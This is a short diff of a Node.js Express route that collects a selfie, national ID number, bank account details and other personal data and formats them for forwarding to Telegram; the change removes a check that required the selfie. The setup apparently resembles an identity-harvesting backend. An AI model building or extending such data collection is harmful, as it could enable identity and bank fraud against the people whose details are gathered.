@@ -110,15 +110,6 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
         const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
-        // Check if file exists
-        if (!selfieFile) {
-            console.log('No file received in request');
-            return res.status(400).json({ 
-                error: 'Selfie picture is required',
-                details: 'No file was uploaded or file validation failed'
-            });
-        }
-
 
         // Format text data for Telegram
         const formattedText = `
